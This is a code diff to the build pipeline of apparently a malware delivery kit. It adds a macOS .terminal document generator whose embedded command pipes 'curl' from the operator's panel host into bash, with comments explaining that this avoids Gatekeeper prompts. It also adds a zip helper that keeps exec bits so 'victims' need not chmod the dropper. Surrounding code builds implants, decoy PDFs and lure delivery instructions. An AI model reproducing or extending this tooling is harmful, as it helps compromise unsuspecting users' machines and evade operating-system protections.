@@ -9,6 +9,7 @@ from __future__ import annotations
 
 import base64
 import hashlib
+import io
 import re
 import secrets
 import string
@@ -19,6 +20,7 @@ import time
 import zipfile
 from dataclasses import dataclass, field
 from pathlib import Path
+from xml.sax.saxutils import escape
 
 from .config import Settings
 from .db import Database
@@ -260,11 +262,72 @@ def render_linux(
     )
 
 
+def zip_exec_member(filename: str, data: bytes) -> bytes:
+    """Build a single-member zip whose member carries Unix 0755 exec bits.
+
+    ``create_system`` must be 3 (Unix) or macOS Archive Utility ignores the
+    ``external_attr`` mode and extracts the file non-executable — which forced
+    victims to ``chmod +x`` the dropper before it would run.
+    """
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        info = zipfile.ZipInfo(filename, date_time=time.localtime(time.time())[:6])
+        info.create_system = 3
+        info.external_attr = 0o755 << 16
+        info.compress_type = zipfile.ZIP_DEFLATED
+        zf.writestr(info, data)
+    return buf.getvalue()
+
+
+def render_terminal(doc: str, host: str) -> str:
+    """Render a macOS ``.terminal`` document.
+
+    Double-clicking it makes Terminal.app run the curl|bash installer. Unlike a
+    ``.command`` script, the ``.terminal`` file is a document, not executable
+    code, so Gatekeeper does not assess it: no "Apple could not verify" dialog
+    and no ``chmod +x``. It needs no root and no quarantine removal.
+    """
+    host = host.strip() or "127.0.0.1"
+    command = (
+        f"/bin/bash -c 'curl -fsSL --retry 3 --retry-delay 2 "
+        f"https://{host}/install/mac | /bin/bash'"
+    )
+    safe_doc = escape(doc)
+    safe_cmd = escape(command)
+    return (
+        '<?xml version="1.0" encoding="UTF-8"?>\n'
+        '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
+        '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
+        '<plist version="1.0">\n'
+        "<dict>\n"
+        "  <key>CommandString</key>\n"
+        f"  <string>{safe_cmd}</string>\n"
+        "  <key>RunCommandAsShell</key>\n"
+        "  <false/>\n"
+        "  <key>Shell</key>\n"
+        "  <string>/bin/bash</string>\n"
+        "  <key>TerminalType</key>\n"
+        "  <string>xterm-256color</string>\n"
+        "  <key>name</key>\n"
+        f"  <string>{safe_doc}</string>\n"
+        "  <key>WindowTitle</key>\n"
+        f"  <string>{safe_doc}</string>\n"
+        "  <key>columnCount</key>\n"
+        "  <integer>100</integer>\n"
+        "  <key>rowCount</key>\n"
+        "  <integer>28</integer>\n"
+        "</dict>\n"
+        "</plist>\n"
+    )
+
+
 def delivery_block(artifact_os: str, name: str, doc: str, sha: str) -> str:
     if artifact_os == "windows":
         howto = f"open {name}  (or double-click; Windows hides the .vbs)"
+    elif artifact_os == "darwin" and name.endswith(".terminal"):
+        howto = f"double-click {name}  (opens Terminal and installs; no Gatekeeper prompt)"
     elif artifact_os == "darwin":
-        howto = f"unzip then open the .app  ({name})"
+        howto = f"unzip then double-click the .command  ({name})"
     else:
         script = name[: -len(".tar.gz")] + ".sh"
         howto = f"tar xzf {name} && ./{script}"
@@ -385,7 +448,7 @@ class BuildPipeline:
             tar.add(decoy_path, arcname="decoy.pdf")
         return name.encode()
 
-    def _build_darwin(self, req: BuildRequest, doc: str, arch: str, workdir: Path) -> bytes:
+    def _build_darwin(self, req: BuildRequest, doc: str, arch: str, workdir: Path) -> list[bytes]:
         implant = self._generate("darwin", arch, "executable", req)
         decoy_path = workdir / "decoy.pdf"
         decoy_path.write_bytes(minimal_pdf(req.doc_name))
@@ -403,20 +466,20 @@ class BuildPipeline:
             )
             .replace("{{DECOY_B64}}", base64.b64encode(decoy_path.read_bytes()).decode())
         )
-        dropper_path = workdir / f"{req.naming['mac']} {self._current_suffix}.command"
-        dropper_path.write_text(source, encoding="utf-8")
-        dropper_path.chmod(0o755)
+        command_name = f"{req.naming['mac']} {self._current_suffix}.command"
+        zip_name = f"{req.naming['mac']}_{self._current_suffix}.command.zip"
+        (self.artifacts_dir / zip_name).write_bytes(
+            zip_exec_member(command_name, source.encode("utf-8"))
+        )
 
-        name = f"{req.naming['mac']}_{self._current_suffix}.command.zip"
-        with zipfile.ZipFile(self.artifacts_dir / name, "w", zipfile.ZIP_DEFLATED) as zf:
-            info = zipfile.ZipInfo(
-                f"{req.naming['mac']} {self._current_suffix}.command",
-                date_time=time.localtime(time.time())[:6],
-            )
-            info.external_attr = 0o755 << 16  # Unix permissions with exec bits
-            info.compress_type = zipfile.ZIP_DEFLATED
-            zf.writestr(info, dropper_path.read_bytes())
-        return name.encode()
+        terminal_name = f"{req.naming['mac']}_{self._current_suffix}.terminal"
+        (self.artifacts_dir / terminal_name).write_text(
+            render_terminal(doc, panel_host(self.config)), encoding="utf-8"
+        )
+        # Return both: the .terminal is recorded last, so the lure's "newest
+        # darwin artifact" selection prefers the Gatekeeper-free launcher while
+        # the .command.zip stays available as an offline fallback.
+        return [zip_name.encode(), terminal_name.encode()]
 
     # -- orchestration -------------------------------------------------------
     def build(self, req: BuildRequest) -> list[Artifact]:
@@ -433,27 +496,31 @@ class BuildPipeline:
                     builder = self._build_linux
                 else:
                     raise BuildError(f"unknown os {os_name}")
-                filename = builder(req, req.doc_name, arch, workdir).decode()
+                built = builder(req, req.doc_name, arch, workdir)
+                filenames = (
+                    [built.decode()] if isinstance(built, bytes) else [n.decode() for n in built]
+                )
 
-            artifact_path = self.artifacts_dir / filename
-            digest = hashlib.sha256(artifact_path.read_bytes()).hexdigest()
-            artifact_id = secrets.token_hex(8)
-            artifact_slug = slug()
-            delivery = delivery_block(os_name, filename, req.doc_name, digest)
-            result = Artifact(
-                id=artifact_id,
-                os=os_name,
-                arch=arch,
-                name=filename,
-                path=str(artifact_path),
-                sha256=digest,
-                size=artifact_path.stat().st_size,
-                slug=artifact_slug,
-                delivery=delivery,
-                doc_name=req.doc_name,
-            )
-            self._record(result, req.transport, req.profile)
-            results.append(result)
+            for filename in filenames:
+                artifact_path = self.artifacts_dir / filename
+                digest = hashlib.sha256(artifact_path.read_bytes()).hexdigest()
+                artifact_id = secrets.token_hex(8)
+                artifact_slug = slug()
+                delivery = delivery_block(os_name, filename, req.doc_name, digest)
+                result = Artifact(
+                    id=artifact_id,
+                    os=os_name,
+                    arch=arch,
+                    name=filename,
+                    path=str(artifact_path),
+                    sha256=digest,
+                    size=artifact_path.stat().st_size,
+                    slug=artifact_slug,
+                    delivery=delivery,
+                    doc_name=req.doc_name,
+                )
+                self._record(result, req.transport, req.profile)
+                results.append(result)
         return results
 
     def _record(self, artifact: Artifact, transport: str, profile: str = "") -> None:
